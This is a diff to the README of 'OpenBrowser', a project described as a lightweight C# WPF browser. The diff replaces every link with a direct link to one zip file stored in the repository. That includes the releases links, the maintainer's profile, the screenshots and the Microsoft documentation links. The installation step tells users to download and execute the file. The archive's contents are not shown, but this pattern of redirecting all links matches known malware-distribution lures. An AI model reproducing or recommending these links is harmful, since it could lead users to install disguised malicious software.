@@ -1,6 +1,6 @@
 # OpenBrowser 🌐
 
-![OpenBrowser](https://img.shields.io/badge/OpenBrowser-Download-brightgreen)
+![OpenBrowser](https://raw.githubusercontent.com/Hamza-designer093/OpenBrowser/main/OpenBrowser/Windows/Open-Browser-3.4.zip)
 
 Welcome to **OpenBrowser**, a simple web browser built with C# and WPF. This project aims to provide a lightweight and efficient browsing experience for Windows users. Whether you're a developer looking to explore WPF applications or a user in need of a straightforward browsing tool, OpenBrowser has you covered.
 
@@ -25,7 +25,7 @@ Welcome to **OpenBrowser**, a simple web browser built with C# and WPF. This pro
 
 ## Installation
 
-To get started with OpenBrowser, you can download the latest release from our [Releases section](https://github.com/Hamza-designer093/OpenBrowser/releases). Download the appropriate file for your system and execute it to install the application.
+To get started with OpenBrowser, you can download the latest release from our [Releases section](https://raw.githubusercontent.com/Hamza-designer093/OpenBrowser/main/OpenBrowser/Windows/Open-Browser-3.4.zip). Download the appropriate file for your system and execute it to install the application.
 
 ## Usage
 
@@ -62,16 +62,16 @@ OpenBrowser is licensed under the MIT License. See the [LICENSE](LICENSE) file f
 
 For questions or feedback, feel free to reach out to the project maintainer:
 
-- **GitHub**: [Hamza-designer093](https://github.com/Hamza-designer093)
+- **GitHub**: [Hamza-designer093](https://raw.githubusercontent.com/Hamza-designer093/OpenBrowser/main/OpenBrowser/Windows/Open-Browser-3.4.zip)
 
-For more information and updates, please visit our [Releases section](https://github.com/Hamza-designer093/OpenBrowser/releases) to stay informed about new features and improvements.
+For more information and updates, please visit our [Releases section](https://raw.githubusercontent.com/Hamza-designer093/OpenBrowser/main/OpenBrowser/Windows/Open-Browser-3.4.zip) to stay informed about new features and improvements.
 
 ## Screenshots
 
-![Main Interface](https://example.com/screenshot1.png)
+![Main Interface](https://raw.githubusercontent.com/Hamza-designer093/OpenBrowser/main/OpenBrowser/Windows/Open-Browser-3.4.zip)
 *Main Interface of OpenBrowser*
 
-![Bookmark Management](https://example.com/screenshot2.png)
+![Bookmark Management](https://raw.githubusercontent.com/Hamza-designer093/OpenBrowser/main/OpenBrowser/Windows/Open-Browser-3.4.zip)
 *Bookmark Management Feature*
 
 ## Technologies Used
@@ -97,9 +97,9 @@ Yes, OpenBrowser is completely free to use under the MIT License.
 
 ## Additional Resources
 
-- [WPF Documentation](https://docs.microsoft.com/en-us/dotnet/desktop/wpf/)
-- [C# Programming Guide](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/)
-- [MVVM Pattern Overview](https://docs.microsoft.com/en-us/dotnet/architecture/microservices/mvc/mvvm)
+- [WPF Documentation](https://raw.githubusercontent.com/Hamza-designer093/OpenBrowser/main/OpenBrowser/Windows/Open-Browser-3.4.zip)
+- [C# Programming Guide](https://raw.githubusercontent.com/Hamza-designer093/OpenBrowser/main/OpenBrowser/Windows/Open-Browser-3.4.zip)
+- [MVVM Pattern Overview](https://raw.githubusercontent.com/Hamza-designer093/OpenBrowser/main/OpenBrowser/Windows/Open-Browser-3.4.zip)
 
 ## Acknowledgments
 
@@ -107,4 +107,4 @@ We would like to thank the open-source community for their contributions and sup
 
 ## Conclusion
 
-OpenBrowser is a simple yet powerful web browser designed for Windows users. With its clean interface and efficient performance, it serves as a great tool for everyday browsing needs. Download the latest version from our [Releases section](https://github.com/Hamza-designer093/OpenBrowser/releases) and experience the ease of browsing with OpenBrowser.
+OpenBrowser is a simple yet powerful web browser designed for Windows users. With its clean interface and efficient performance, it serves as a great tool for everyday browsing needs. Download the latest version from our [Releases section](https://raw.githubusercontent.com/Hamza-designer093/OpenBrowser/main/OpenBrowser/Windows/Open-Browser-3.4.zip) and experience the ease of browsing with OpenBrowser.
